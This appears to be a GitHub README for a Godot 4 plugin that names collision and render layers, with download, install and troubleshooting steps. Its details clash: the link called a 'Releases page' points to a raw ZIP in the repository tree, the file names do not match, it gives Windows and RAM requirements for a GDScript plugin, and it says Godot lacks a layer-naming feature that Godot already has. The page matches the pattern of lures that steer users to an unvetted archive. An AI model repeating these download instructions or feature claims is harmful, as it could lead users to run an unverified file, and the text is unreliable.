# 🎯 godot-layer-namer - Name Collision and Render Layers Easily

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip)

A straightforward Godot 4 plugin to help you name and organize collision and render layers. This tool is modeled after Unity's layer system, making it easier to manage layers by giving them meaningful names.

---

## 🔍 What is godot-layer-namer?

godot-layer-namer lets you assign names to your collision and render layers inside Godot 4. Instead of seeing just numbers for layers, you get clear, descriptive names. This makes your game project easier to manage.

If you have used Unity before, this will feel familiar. The plugin brings that helpful layer-naming feature into Godot, which only uses numbers by default.

---

## ⚙️ Key Features

- Name collision layers and render layers with custom labels.
- View layer names instead of numbers in layer dropdowns.
- Compatible with Godot 4 and uses GDScript.
- Lightweight and does not affect performance.
- Easy to install and use with your existing Godot projects.

---

## 🖥 System Requirements

- Windows 10 or later
- Godot Engine 4.0 or newer installed
- At least 2GB of RAM (4GB recommended)
- 100MB free disk space for plugin files
- Internet connection for downloading the plugin

This plugin works inside Godot 4, so make sure you have Godot installed before installing this.

## 🚀 Getting Started

Follow these steps to download, install, and enable the plugin in your Godot project.

---

## 📥 Download & Install

You need to download the plugin files from the official releases page.

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-grey?style=for-the-badge)](https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip)

1. Open your web browser.
2. Go to the Releases page here: https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip
3. Look for the latest release version.
4. Download the ZIP file named something like `godot-layer-namer-x.x.x.zip`.
5. Once downloaded, locate the ZIP file on your computer.
6. Right-click the ZIP file and choose "Extract All..." to unzip it.
7. You should now have a folder named `godot-layer-namer`.

---

## 📂 Adding the Plugin to Your Godot Project

1. Open your Godot 4 project.
2. In Godot, open the "FileSystem" panel.
3. Copy the extracted `godot-layer-namer` folder into the `addons` folder of your Godot project.  
   - If the `addons` folder does not exist, create it in the root of your project folder.
4. The full path should look like this:  
   `your_project_folder/addons/godot-layer-namer`

---

## ⚙️ Enabling the Plugin in Godot

1. In Godot, go to `Project` > `Project Settings`.
2. Click on the `Plugins` tab.
3. You will see `godot-layer-namer` listed there.
4. Click the status checkbox to enable the plugin.
5. Restart Godot or reload your project if needed.

---

## 🧩 Using the Plugin

After enabling, you can start naming layers.

- Open the Project Settings in Godot.
- Navigate to the "Layer Names" section (added by the plugin).
- You will find fields to name both collision and render layers.
- Enter meaningful names for each layer you use in your project.
- Save the settings.

Your layers will now show the names you gave them instead of just numbers when working in Godot’s editor.

---

## 🛠 Troubleshooting

If the plugin does not appear in the Plugins list:

- Make sure the folder is correctly placed under `addons/godot-layer-namer`.
- Check you extracted the full contents of the ZIP file.
- Restart Godot after placing the plugin files.

If named layers do not show up:

- Confirm the plugin is enabled in Project Settings.
- Ensure you entered names in the correct Layer Names section.
- Reload the project if changes don’t appear immediately.
